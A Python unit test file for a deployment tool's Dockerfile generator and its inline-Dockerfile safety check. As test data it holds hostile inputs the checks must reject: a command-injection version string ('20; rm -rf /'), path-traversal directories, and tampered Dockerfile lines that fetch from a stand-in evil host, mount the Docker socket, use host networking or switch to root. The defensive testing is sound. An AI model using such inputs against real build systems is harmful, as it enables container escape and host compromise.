"""Codeskys-generated Dockerfiles for the 13 framework presets (kova/dockerfiles.py) and
the inline-Dockerfile check in composegen.assert_safe. Real builds of each framework are
in forgeops ops/engine/framework_build_test.sh."""
import json
import unittest

from kova import buildpolicy, composegen, dockerfiles
from kova.composegen import ComposeError, _inline_problem, compose_escape
from kova.dockerfiles import DockerfileError
from kova.gitinfo import FRAMEWORKS

FRAMEWORK_IDS = [f for f in FRAMEWORKS if f != "docker"]
SHA = "c" * 40
DEP = "dep_abcdef0123456789"


def doc_with(inline):
    return composegen.generate(
        slug="web-app", deployment_id=DEP, repository_id=1,
        app_context=composegen.build_context("https://github.com/octocat/Hello-World", SHA),
        runtime_image="codeskys/runtime:abc123", secret_file=f"/srv/codeskys/runtime-secrets/{DEP}/runtime_secret",
        ingress_network="codeskys-apps", link_network="codeskys-runtime-link", private_cidr="10.213.0.16/28",
        project_id=1, dockerfile_inline=inline)


class Generation(unittest.TestCase):
    def test_all_thirteen_framework_presets_generate_a_valid_dockerfile(self):
        self.assertEqual(len(FRAMEWORK_IDS), 13)
        for fw in FRAMEWORK_IDS:
            with self.subTest(fw=fw):
                text, port = dockerfiles.generate({"framework": fw})
                self.assertEqual(_inline_problem(compose_escape(text)), "")
                self.assertEqual(buildpolicy.dockerfile_problems(text), [])
                froms = [l.split()[1] for l in text.splitlines() if l.startswith("FROM ")]
                self.assertTrue(froms and set(froms) <= dockerfiles.BASE_IMAGES)
                self.assertEqual(port, 8080 if FRAMEWORKS[fw]["static"] else FRAMEWORKS[fw]["port"])
                users = [l for l in text.splitlines() if l.startswith("USER ")]
                self.assertTrue(users and users[-1] != "USER root", "the runtime never runs as root")

    def test_the_projects_node_version_selects_the_image(self):
        for version, image in (("20.x", "node:20-bookworm-slim"), ("18", "node:18-bookworm-slim"),
                               ("v22.11.0", "node:22-bookworm-slim"), (None, "node:20-bookworm-slim")):
            with self.subTest(version=version):
                text, _ = dockerfiles.generate({"framework": "nextjs", "node_version": version})
                self.assertIn(f"FROM {image}", text)
        for bad in ("16.x", "latest", "20; rm -rf /"):
            with self.subTest(bad=bad), self.assertRaises(DockerfileError):
                dockerfiles.generate({"framework": "react", "node_version": bad})
        text, _ = dockerfiles.generate({"framework": "flask", "node_version": "16.x"})   # not a Node project
        self.assertNotIn("FROM node", text)

    def test_docker_projects_use_their_own_dockerfile(self):
        with self.assertRaises(DockerfileError):
            dockerfiles.generate({"framework": "docker"})

    def test_student_commands_become_one_quoted_argument(self):
        text, _ = dockerfiles.generate({"framework": "node", "install_command": 'npm ci && echo "x; y" $HOME',
                                        "start_command": "node server.js"})
        self.assertIn(json.dumps(["/bin/sh", "-c", 'npm ci && echo "x; y" $HOME']), text)
        self.assertIn(json.dumps(["/bin/sh", "-c", "exec node server.js"]), text)
        self.assertEqual(_inline_problem(compose_escape(text)), "")

    def test_unsafe_settings_are_refused(self):
        for over in ({"install_command": "npm i\nRUN --network=host x"}, {"build_command": "a\rb"},
                     {"build_command": "x\x00"}, {"start_command": "node --network=host"},
                     {"build_command": "make --SECURITY=insecure"}, {"install_command": "x" * 501},
                     {"output_dir": "../../etc"}, {"output_dir": "dist/../.."}, {"output_dir": "a b"},
                     {"output_dir": "dist;rm"}):
            with self.subTest(over=over), self.assertRaises(DockerfileError):
                dockerfiles.generate({"framework": "react", **over})

    def test_server_frameworks_need_a_start_command(self):
        with self.assertRaises(DockerfileError):
            dockerfiles.generate({"framework": "flask", "start_command": "   "})

    def test_root_directory_becomes_a_git_subdirectory_context(self):
        self.assertTrue(composegen.build_context("https://github.com/a/b", SHA, "apps/web").endswith(f"#{SHA}:apps/web"))
        for bad in ("../x", "a/../../b", "a b", "a;b"):
            with self.subTest(bad=bad), self.assertRaises(ComposeError):
                composegen.build_context("https://github.com/a/b", SHA, bad)


class InlineCheck(unittest.TestCase):
    def setUp(self):
        self.good, _ = dockerfiles.generate({"framework": "react"})

    def test_generated_inline_dockerfile_is_accepted_in_a_compose_file(self):
        d = doc_with(self.good)
        self.assertEqual(set(d["services"]["app"]["build"]), {"context", "dockerfile_inline"})

    def test_tampered_inline_dockerfiles_are_refused(self):
        tamper = {
            "no marker": self.good.split("\n", 1)[1],
            "other base image": self.good.replace(dockerfiles.NODE_IMAGE, "evil/node:latest"),
            "copy from another image": self.good.replace("COPY --from=build /site", "COPY --from=evil/img /bin"),
            "shell-form RUN": self.good + "RUN curl http://127.0.0.1:8000\n",
            "RUN flag": self.good + 'RUN --network=host ["/bin/sh", "-c", "x"]\n',
            "network inside exec": self.good + 'RUN ["/bin/sh", "-c", "x --network=host"]\n',
            "ADD": self.good + "ADD https://evil.example/x /x\n",
            "VOLUME": self.good + "VOLUME /var/run/docker.sock\n",
            "USER other": self.good + "USER 0\n",
            "syntax directive": "# syntax=evil/frontend\n" + self.good,
            "exec with extra args": self.good + 'RUN ["/bin/sh", "-c", "x", "y"]\n',
            "not a string": None,
        }
        for name, text in tamper.items():
            with self.subTest(name=name):
                self.assertNotEqual(_inline_problem(compose_escape(text) if text else text), "")
                if text is not None:                  # None = no inline Dockerfile at all (repository one)
                    with self.assertRaises(ComposeError):
                        doc_with(text)

    def test_dollar_signs_reach_the_build_literally_never_interpolated(self):
        d = doc_with(self.good)
        stored = d["services"]["app"]["build"]["dockerfile_inline"]
        self.assertIn('d=$$(dirname', stored)
        self.assertIn("$$uri", stored)
        self.assertEqual(stored.replace("$$", "$"), self.good)
        self.assertIn("unescaped", _inline_problem(self.good))            # raw text would be interpolated
        self.assertIn("unescaped", _inline_problem(stored.replace("$$uri", "${SECRET}")))

    def test_inline_and_repository_dockerfile_cannot_be_combined(self):
        d = doc_with(self.good)
        d["services"]["app"]["build"]["dockerfile"] = "Dockerfile"
        with self.assertRaises(ComposeError):
            composegen.assert_safe(d)


class FetchPath(unittest.TestCase):
    def test_dockerfile_path_must_stay_in_the_repository(self):
        for path in ("../Dockerfile", "a/../../Dockerfile", "x/evil", "Dockerfile.prod", "/Dockerfile"):
            with self.subTest(path=path), self.assertRaises(buildpolicy.PolicyError):
                buildpolicy.fetch_dockerfile("https://github.com/a/b", SHA, path)
